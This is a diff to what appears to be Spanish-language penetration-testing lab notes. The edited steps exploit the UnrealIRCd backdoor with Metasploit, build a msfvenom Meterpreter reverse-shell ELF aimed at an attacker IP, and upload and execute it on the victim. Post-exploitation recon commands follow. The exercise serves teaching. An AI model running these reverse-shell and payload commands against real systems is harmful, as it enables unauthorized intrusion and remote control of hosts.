@@ -404,21 +404,41 @@ vncviewer <IP_VICTIMA>:5900
 ### Guía de comandos
 
 ```bash
-# PASO 0 — Obtener shell inicial en la víctima (ej. con UnrealIRCd del Ejercicio 6)
-# msfconsole > use exploit/unix/irc/unreal_ircd_3281_backdoor > set RHOSTS <IP_VICTIMA> > exploit
-# Esto abre una shell cmd/unix. Desde ahí ejecutaremos la transferencia y el payload.
+# PASO 0 — Obtener sesión Meterpreter inicial (UnrealIRCd)
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set payload cmd/unix/reverse_perl
+exploit
 
-# PASO 1 — Generar payload Linux reverse shell con MSFVenom (en Kali)
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f elf -o /tmp/payload.elf
+# → sesión Meterpreter 1 abierta
 
-upload /tmp/payload.elf /tmp/payload.elf    
+# PASO 1 — Generar payload con msfvenom (desde otra terminal Kali)
+#          Usar puerto DISTINTO (4446) para evitar conflicto
+#          con la sesión 1
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4446 -f elf -o /tmp/payload.elf
 
-# PASO 5 — Asignar permisos y ejecutar el payload (en la víctima)
+# PASO 2 — Handler en msfconsole con ese puerto, en background
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST <IP_ATACANTE>
+set LPORT 4446
+exploit -j
+
+# PASO 3 — Subir payload a la víctima (desde sesión 1)
+sessions -i 1
+upload /tmp/payload.elf /tmp/payload.elf
+
+# PASO 4 — Asignar permisos de ejecución (desde shell de la víctima)
+shell
 chmod +x /tmp/payload.elf
-/tmp/payload.elf
+exit
 
-# PASO 6 — Volver a msfconsole, la sesión Meterpreter debería haberse recibido
-sessions -i <ID_SESION>
+# PASO 5 — Ejecutar payload
+execute -f /tmp/payload.elf
+# El handler recibe conexión y entrega etapa Meterpreter
+
+# PASO 6 — La sesión 2 se abre automáticamente
+sessions
+sessions -i 2
 
 # Post-explotación
 getuid
@@ -428,8 +448,10 @@ hostname
 cat /etc/*release
 ```
 
+
 ![](attachments/{76217B7C-0EC9-4FC0-B541-5E3610524F24}.png)
-![](attachments/{1715C8D5-701B-49BD-AC33-80BC87453E4C}.png)
+
+![](attachments/{460848D4-543D-4CD6-AB85-CCD68853B1D5}.png)
 
 
 
